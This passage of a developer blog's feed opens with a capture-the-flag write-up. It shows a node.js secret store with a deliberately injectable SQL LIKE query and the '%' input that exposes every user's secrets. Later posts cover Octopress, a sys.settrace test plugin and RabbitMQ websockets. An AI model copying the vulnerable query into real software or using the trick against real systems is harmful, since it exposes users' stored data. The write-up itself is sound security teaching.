     if (err) throw err;

           res.header(&#39;Content-Type&#39;, &#39;text/html&#39;);
           res.redirect(req.path + &#39;?namespace=&#39; + namespace);
         });
});

if (process.argv.length &gt; 2) {
  var socket = process.argv[2];
  console.log(&quot;Starting server on UNIX socket &quot; + socket);
  app.listen(socket);
} else {
  console.log(&quot;Starting server at http://localhost:3000/&quot;);
  app.listen(3000);
}</code></pre></noscript></div>




<div><script src='https://gist.github.com/3688659.js?file=level00.html'></script>
<noscript><pre><code>&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Secret Safe&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    {{#namespace}}
    &lt;div style=&quot;border-width: 2px; border-style: outset; padding: 5px&quot;&gt;
      Showing secrets for &lt;strong&gt;{{namespace}}&lt;/strong&gt;:
      &lt;table&gt;
        &lt;thead&gt;
          &lt;tr&gt;
            &lt;th&gt;Key&lt;/th&gt;
            &lt;th&gt;Value&lt;/th&gt;
          &lt;/tr&gt;
        &lt;/thead&gt;
        &lt;tbody&gt;
          {{#secrets}}
          &lt;tr&gt;
            &lt;td&gt;{{ key }}&lt;/td&gt;
            &lt;td&gt;{{ secret }}&lt;/td&gt;
          &lt;/tr&gt;
          {{/secrets}}
          {{^secrets}}
          &lt;tr&gt;
            &lt;td span=&quot;2&quot;&gt;
              You have no secrets stored with us. Try using the form below.
            &lt;/td&gt;
          &lt;/tr&gt;
          {{/secrets}}
        &lt;/tbody&gt;
      &lt;/table&gt;

      &lt;hr /&gt;
    &lt;/div&gt;
    {{/namespace}}

    &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;
      &lt;p&gt;
        &lt;label for=&quot;namespace&quot;&gt;Namespace:&lt;/label&gt;
        &lt;input type=&quot;text&quot; name=&quot;namespace&quot; id=&quot;namespace&quot;
            value=&quot;{{ namespace }}&quot; /&gt;
      &lt;/p&gt;
      &lt;p&gt;
        &lt;label for=&quot;secret_name&quot;&gt;Name of your secret:&lt;/label&gt;
        &lt;input type=&quot;text&quot; name=&quot;secret_name&quot; id=&quot;secret_name&quot;&gt;
      &lt;/p&gt;
      &lt;p&gt;
        &lt;label for=&quot;secret_value&quot;&gt;Your secret:&lt;/label&gt;
        &lt;input type=&quot;password&quot; name=&quot;secret_value&quot; id=&quot;secret_value&quot;&gt;
      &lt;/p&gt;
      &lt;p&gt;
        &lt;input type=&quot;submit&quot; value=&quot;Store my secret!&quot; /&gt;
      &lt;/p&gt;
    &lt;/form&gt;
    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
      &lt;label for=&quot;change_namespace&quot;&gt;
        Want to retrieve your secrets? View secrets for:
      &lt;/label&gt;
      &lt;input name=&quot;namespace&quot; id=&quot;change_namespace&quot; /&gt;
      &lt;input type=&quot;submit&quot; value=&quot;View&quot; /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre></noscript></div>


<p>So you have a node.js server script, with an HTML front-end. The front-end allows you to submit a web form which allows you to retrieve <em>your</em> stored secret but the secret to level 1 is also stored in the same database.</p>

<p>Reading the code, the query on line 34 jumps out at you:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">query</span> <span class="o">=</span> <span class="s1">&#39;SELECT * FROM secrets WHERE key LIKE ? || &quot;.%&quot;&#39;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Even though I&rsquo;m not too familiar with <a href="http://nodejs.org">nodejs</a> or its db API, the part where it concatenates user input with &ldquo;.%&rdquo; looks suspicious. <code>||</code> is the SQL operator for concatenation, and &lsquo;%&rsquo; is the SQL wildcard that matches 0 or more characters of any kind. What if my user input is &ldquo;%&rdquo;?</p>

<p>Voilà! That&rsquo;s it! <code>%.%</code> gives you all passwords with namespace that has a dot in the middle.</p>

<h2>Conclusion</h2>

<p><a href="http://xkcd.com/327/">SQL-injection</a> is a known security issue for a long time yet you&rsquo;d be surprised how many sites are still subject to such exploits. The problem with level 0 code is exactly that: unsanitized user input is sent directly to the database for execution. So everytime a string concatenation is seen in a SQL statement, you have to ask yourself: is the ting being concatenated trustworthy? Use prepared statement or your database&rsquo;s escape function wherever possible.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Statically Yours]]></title>
    <link href="http://kevinjqiu.github.io/2012/06/18/statically-yours/"/>
    <updated>2012-06-18T16:54:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2012/06/18/statically-yours</id>
    <content type="html"><![CDATA[<p><strong>Migrating from wordpress to octopress</strong></p>

<p>I&rsquo;m not an avid blogger but like everyone else, I have a <a href="http://reminiscential.wordpress.com">blog</a> which I casually write about life and programming. Being hosted by <a href="http://wordpress.org">wordpress</a>, it was an out-of-the-box solution and comes with a lot of bells and whistles. However, for a programming blog, it has some significant shortcomings:</p>

<ul>
<li><p>Conflation of content and style.
A Wordpress post is written in a weird combination of HTML markups and custom wordpress macros, which means you have to rely on their WYSIWYG editor to generate the correct markups, which means you can&rsquo;t use your favourite editor to write a blog post.</p></li>
<li><p>Limited versioning.
Everytime you save a blog post, it creates a revision, but to view the diff is not as easy as <code>git diff</code>.</p></li>
<li><p>Embedding a code snippet sucks
Wordpress uses a syntax highlighting macro, but the language it supports is very limited. There&rsquo;s third-party plugin that allows you to embed code snippet from <a href="http://gist.github.com">gist</a>, but you have to subscribe to their premium plan.</p></li>
</ul>


<p>Static site generators are becoming increasingly popular among developers. Developer blogs don&rsquo;t need a ton of visuals, so content with basic styling is more than enough. Most importantly, it has to do code embedding well. A bit of research, it turns out that <a href="octopress.org">Octopress</a> seems to be ubiquitous.</p>

<p>After a day of setting up, here&rsquo;s what I found:</p>

<h2>Installation</h2>

<p>I&rsquo;m primarily a Python developer, so setting up a Ruby project is a bit foreign to me, especially since Octopress only works with Ruby 1.9+, I need to setup <a href="http://rvm.io">RVM</a>, and even though it&rsquo;s well documented, it&rsquo;s not without speed bumps on my Ubuntu system. In particular, you need to install <code>libssl-dev</code> before you let RVM compile and install Ruby, otherwise you will get something like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>no such file to load -- openssl (LoadError)</span></code></pre></td></tr></table></div></figure>


<p>I had to</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo apt-get install libssl-dev</span></code></pre></td></tr></table></div></figure>


<p>and re-install Ruby</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rvm reinstall 1.9</span></code></pre></td></tr></table></div></figure>


<h2>Setting up TLD</h2>

<p>After the first deploy, the pages are already accessible via <code>&lt;yourname&gt;.github.com</code>, but pointing your domain to the page is just as easy. I followed <a href="https://help.github.com/articles/setting-up-a-custom-domain-with-pages">this</a> official article from Github.</p>

<h2>Static sweetness</h2>

<p>There we go! Sweet static pages:</p>

<ul>
<li>Page views are extremely fast</li>
<li><a href="http://daringfireball.net/projects/markdown/syntax">Markdown</a></li>
<li>Version controlled blog posts</li>
<li>Embedding code is <a href="http://octopress.org/docs/blogging/code/">easy</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Use Python's sys.settrace() for fun and for profit]]></title>
    <link href="http://kevinjqiu.github.io/2012/04/17/use-pythons-sys-dot-settrace-for-fun-and-for-profit/"/>
    <updated>2012-04-17T16:58:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2012/04/17/use-pythons-sys-dot-settrace-for-fun-and-for-profit</id>
    <content type="html"><![CDATA[<h2>The itch to scratch</h2>

<p>Everyone in the software industry knows Kent Beck, the pioneers of extreme programming and test-driven development and the co-author of JUnit. One of his lesser known project was <a href="http://junitmax.com">JUnitMax</a>, which aims to reduce the time developers have to wait while tests are running. One of the ideas behind that is that when code changes, only the test cases that exercise the code need to be run, instead of running the entire suite. The idea makes a lot of sense to me, but at the time, I (and the development shop I was in) wasn&rsquo;t practising enough TDD, so unit test time wasn&rsquo;t a big problem for me back then.</p>

<p>Fast-forward a few years, now as the project in my current company gets bigger, the time it takes to run tests is slowly becoming an impeding factor of my productivity. I remembered JUnitMax and say to myself, wouldn&rsquo;t it be neat if something like JUnitMax were available? As the name suggests, JUnitMax is for Java while my project is in Python. Java, being a statically-typed language, has the blessings of statical analysis, which means a tool like JUnitMax can figure out which test cases cover which lines of code simply by type analysis. Python, however, being a dynamic language, doesn&rsquo;t have this ability.</p>

<p>A few days ago, while I was running unit tests with coverage, it dawned on me that if the coverage tool knows which lines of the source code is covered by unit tests, couldn&rsquo;t the same technique be used to figure out which lines are covered by which test cases?</p>

<p>So, I started looking into <a href="http://nedbatchelder.com/code/coverage/">coveragepy</a>&rsquo;s source code, and watching its author <a href="http://nedbatchelder.com/blog/">Ned Batchelder</a>&rsquo;s excellent PyCon2011 <a href="http://blip.tv/pycon-us-videos-2009-2010-2011/pycon-2011-python-aware-python-4896752">video</a> on <code>sys.settrace</code>. I wanted to build a proof-of-concept tool that integrates with the de-facto Python unit-test tool <a href="https://github.com/nose-devs/nose">nose</a>, that, when run, gathers the information about which lines in the files in the source folder are covered by which test cases, and hence <a href="https://github.com/kevinjqiu/nostrils">nostrils</a> is born.</p>

<h2>Here comes <code>sys.settrace()</code></h2>

<p>Python&rsquo;s motto is &ldquo;batteries included&rdquo;. This is manifested in many Python&rsquo;s stanndard library modules, such as ast (source code parsing) and dis (bytecode disassembly). One of which is the ability to make the Python interpreter call an external function whenever a line of code is being executed. You can do a lot of fun stuff with it, for example, Coverage.py uses this to build code coverage data; pdb uses it to insert breakpoints into a running application and change the way a Python program is executed.</p>

<h2>How can it be used?</h2>

<p>For <em>nostrils</em>, we need to write a nose plugin that installs the trace function when a test is encountered. The trace function records the line numbers and the current test case name. After all tests are run, we have our map.</p>

<h2>A simple use case</h2>

<p>To start, we need a simple use case:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># worker.py</span>
</span><span class='line'><span class="c"># this is the code-under-test</span>
</span><span class='line'><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class='line'>    <span class="n">z</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">z</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">subtract</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class='line'>    <span class="n">z</span> <span class="o">=</span> <span class="n">x</span> <span class="o">-</span> <span class="n">y</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">z</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># test_worker.py</span>
</span><span class='line'><span class="c"># test cases</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">worker</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">test_add</span><span class="p">():</span>
</span><span class='line'>    <span class="k">assert</span> <span class="mi">1</span> <span class="o">==</span> <span class="n">worker</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">test_add___negative</span><span class="p">():</span>
</span><span class='line'>    <span class="k">assert</span> <span class="mi">0</span> <span class="o">==</span> <span class="n">worker</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">test_subtract</span><span class="p">():</span>
</span><span class='line'>    <span class="k">assert</span> <span class="mi">0</span> <span class="o">==</span> <span class="n">worker</span><span class="o">.</span><span class="n">subtract</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">TestFoo</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">test_add</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="k">assert</span> <span class="mi">5</span> <span class="o">==</span> <span class="n">worker</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>As you can see, we have 4 tests and 2 methods-under-test. Our goal is that when running <code>nosetests --with-nostrils</code> (<code>--with-nostrils</code> is the switch to turn on the nostrils plugin), we get the following mappings:</p>

<figure class='code'><figcaption><span>worker.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class='line'>  <span class="n">z</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span> <span class="c"># test_add, test_add_negative, TestFoo.test_add</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">z</span>  <span class="c"># test_add, test_add_negative, TestFoo.test_add</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">subtract</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span class='line'>  <span class="n">z</span> <span class="o">=</span> <span class="n">x</span> <span class="o">-</span> <span class="n">y</span> <span class="c"># test_subtract</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">z</span>  <span class="c"># test_subtract</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Nose plugin</h2>

<p>I won&rsquo;t go into the details about how to create a plugin for nose. You can read it <a href="http://readthedocs.org/docs/nose/en/latest/plugins/writing.html,%20and%20you%20can%20take%20a%20look%20at%20my%20sample%20setup%20[here](https://raw.github.com/kevinjqiu/nostrils/master/setup.py">here</a>. In a nutshell, every plugin has a name, and when nose is supplied with &ndash;with-<em>plugin_name</em>, your plugin is activated. Nose provides a test lifecycle &ldquo;hooks&rdquo; that plugins can implement. For example, <code>startTest</code> is called when a test case is discovered and adapted into a nose <a href="http://readthedocs.org/docs/nose/en/latest/api/test_cases.html">TestCase</a>. <code>addSuccess</code> is called when a test case succeeded. <code>finalize</code> is called when all tests are finished.</p>

<p>Here&rsquo;s how my plugin looks like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">class</span> <span class="nc">Nostrils</span><span class="p">(</span><span class="n">Plugin</span><span class="p">):</span>
</span><span class='line'>    <span class="n">name</span> <span class="o">=</span> <span class="s">&#39;nostrils&#39;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">addError</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">test</span><span class="p">,</span> <span class="n">err</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">_restore_tracefn</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">addFailure</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">test</span><span class="p">,</span> <span class="n">err</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">_restore_tracefn</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">addSkip</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">test</span><span class="p">,</span> <span class="n">err</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">_restore_tracefn</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">addSuccess</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">test</span><span class="p">,</span> <span class="n">err</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">_restore_tracefn</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">startTest</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">test</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">_current_test</span> <span class="o">=</span> <span class="n">test</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">_install_tracefn</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">finalize</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">result</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">_print</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_install_tracefn</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">_orig_tracefn</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">gettrace</span><span class="p">()</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">settrace</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_trace</span><span class="p">)</span> <span class="c"># See below</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">def</span> <span class="nf">_restore_tracefn</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">settrace</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_orig_tracefn</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The idea is that we install the trace function when test starts, and restore the trace function back to what it was. We also keeps track of what&rsquo;s the current test in <code>self._current_test</code>.</p>

<h2>Trace function</h2>

<p>Now let&rsquo;s have a look at the trace function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">class</span> <span class="nc">Nostrils</span><span class="p">(</span><span class="n">Plugin</span><span class="p">):</span>
</span><span class='line'>  <span class="c"># ...</span>
</span><span class='line'>  <span class="k">def</span> <span class="nf">_trace</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">frame</span><span class="p">,</span> <span class="n">event</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">event</span> <span class="o">==</span> <span class="s">&#39;line&#39;</span><span class="p">:</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">_trace_down</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_trace</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">def</span> <span class="nf">_trace_down</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
</span><span class='line'>    <span class="k">while</span> <span class="n">frame</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_code</span> <span class="o">==</span> <span class="n">test</span><span class="o">.</span><span class="n">__call__</span><span class="o">.</span><span class="n">func_code</span><span class="p">:</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">_collect</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
</span><span class='line'>      <span class="n">frame</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_back</span>
</span></code></pre></td></tr></table></div></figure>


<p>A trace function should take 3 parameters:
* frame: the current <a href="http://docs.python.org/reference/datamodel.html#types">frame</a> object
* event: what type of event that triggered the trace function? See <a href="http://docs.python.org/library/sys.html#sys.settrace">here</a>
* <code>*args</code>: any additional arguments</p>

<p>Here, I&rsquo;m only interested in the <code>line</code> event, which is triggered when a new line of code is being executed. When this happens, we invoke <code>_trace_down</code>, which walks the frame stack by recursing on <code>frame.f_back</code>. When it&rsquo;s <code>None</code>, we&rsquo;re at the bottom of the stack. Because we&rsquo;re tracing the execution of tests, we can probably stop traversing when the code object of the frame is the entry point of the test case (<code>if frame.f_code == test.__call__.func_code</code>). This way, we save ourselves some unnecessary traversals.</p>

<h2>Data Collection</h2>

<p>There&rsquo;s are few things we need to collect: filename, line number of the code being executed and the test case name that covers the code.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">class</span> <span class="nc">Nostrils</span><span class="p">(</span><span class="n">Plugin</span><span class="p">):</span>
</span><span class='line'>  <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>    <span class="nb">super</span><span class="p">(</span><span class="n">Nostrils</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span><span class="o">.</span><span class="n">__init__</span><span class="p">()</span>
</span><span class='line'>    <span class="bp">self</span><span class="o">.</span><span class="n">_data</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span>
</span><span class='line'>      <span class="k">lambda</span> <span class="p">:</span> <span class="n">defaultdict</span><span class="p">(</span>
</span><span class='line'>        <span class="k">lambda</span> <span class="p">:</span> <span class="nb">set</span><span class="p">([])</span>
</span><span class='line'>      <span class="p">)</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">def</span> <span class="nf">_collect</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
</span><span class='line'>    <span class="n">filename</span><span class="p">,</span> <span class="n">lineno</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_code</span><span class="o">.</span><span class="n">co_filename</span><span class="p">,</span> <span class="n">frame</span><span class="o">.</span><span class="n">f_lineno</span>
</span><span class='line'>    <span class="bp">self</span><span class="o">.</span><span class="n">_data</span><span class="p">[</span><span class="n">filename</span><span class="p">][</span><span class="n">lineno</span><span class="p">]</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="s">.</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">_current_test</span><span class="o">.</span><span class="n">address</span><span class="p">())</span>
</span></code></pre></td></tr></table></div></figure>


<p>The data structure we use here is a dictionary of dictionary. At the top level, the keys are filenames, and the values are dictionaries of with keys the line numbers and the values the set of test case names. The data structure looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="s">&#39;foo.py&#39;</span><span class="p">:{</span>
</span><span class='line'>      <span class="mi">1</span> <span class="p">:</span> <span class="nb">set</span><span class="p">([</span><span class="s">&#39;test_foo.py:test_foo_case1&#39;</span><span class="p">,</span> <span class="s">&#39;test_foo.py:test_foo_case2&#39;</span><span class="p">]),</span>
</span><span class='line'>      <span class="mi">2</span> <span class="p">:</span> <span class="nb">set</span><span class="p">([</span><span class="s">&#39;test_foo.py:test_foo_case1&#39;</span><span class="p">,</span> <span class="s">&#39;test_foo.py:test_foo_case2&#39;</span><span class="p">]),</span>
</span><span class='line'>      <span class="mi">3</span> <span class="p">:</span> <span class="nb">set</span><span class="p">([</span><span class="s">&#39;test_foo.py:test_foo_case2&#39;</span><span class="p">])</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>There we have it! We have a prototype of what could become a PyUnitMax ;)</p>

<h2>Potential Problems</h2>

<ul>
<li>Scale: Now I&rsquo;m only running nostrils on trivial code base. Profiling and optimization is needed if nostrils were to be used in real-world cases.</li></li>
<li>Multi-threading: No consideration was given to multi-threading at this stage.</li></li>
</ul>


<h2>Collaborators welcome!</h2>

<p>I have since refactored the code, revised the data structure and published it on <a href="https://github.com/kevinjqiu/nostrils">github</a>. Please provide me with feedbacks and suggestions.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Realtime notification delivery using rabbitmq]]></title>
    <link href="http://kevinjqiu.github.io/2012/04/07/realtime-notification-delivery-using-rabbitmq/"/>
    <updated>2012-04-07T16:50:00-04:00</updated>
    <id>http://kevinjqiu.github.io/2012/04/07/realtime-notification-delivery-using-rabbitmq</id>
    <content type="html"><![CDATA[<p>Our company has &ldquo;hack-off&rdquo; days once a while, where we developers get to choose whatever we would like to work on and present it to the entire company by the end of the day. I have been hearing this <a href="http://en.wikipedia.org/wiki/WebSocket">websocket</a> buzz for a while now and would like to build something interesting with it.</p>

<h2>WebSocket</h2>

<p>Websocket is a persistent bi-directional connection between the browser and the server. With websocket, web browser can post message to the server, but what&rsquo;s more interesting is that the server is able to push messages to the client (browser). This breaks away from the traditional web application request/response model. Traditionally, the client makes the request and waits for the server to give an answer. AJAX is revolutionary, but essentially, it&rsquo;s still the same model: the client asks the server whether there&rsquo;s anything interesting, but not the other way around. With websocket, the server suddenly becomes more involved and able to deliver more engaged user experience.</p>

<p><a href="http://www.freshbooks.com/">Our company</a> provides web application for online invoicing. The web application allows users to create clients, create invoices, send them to clients, and so on. Each one of these are &ldquo;events&rdquo; which gets sent to <a href="http://www.rabbitmq.com/">RabbitMQ</a>. We then have a plethora of RabbitMQ consumers that read messages off the queue and do interesting stuff with them.</p>

<h2>Proof of concept</h2>

<p>For this hack-off, my goal is to write a RabbitMQ consumer that reads the messages off the message queue, and deliver (notify) them to the front-end using websocket.</p>

<p><a href="http://reminiscential.files.wordpress.com/2012/04/websocket-1.png"><img src="http://reminiscential.files.wordpress.com/2012/04/websocket-1.png?w=300" alt="" title="architecture" width="300" height="181" class="aligncenter size-medium wp-image-292" /></a></p>

